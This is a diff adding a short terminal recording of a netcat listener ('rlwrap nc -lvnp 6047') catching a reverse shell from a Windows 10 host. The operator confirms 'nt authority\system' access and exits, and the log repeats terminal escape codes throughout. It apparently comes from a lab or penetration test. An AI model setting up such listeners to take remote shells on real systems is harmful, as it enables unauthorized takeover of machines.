@@ -1,0 +1,14 @@
+Script started on 2025-03-16 15:56:18+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 13281
+[KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>whoamiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami
+[Knt authority\system[Knt authority\system[Knt authority\system
+[K
+[KC:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 15:58:37+03:00 [COMMAND_EXIT_CODE="0"]
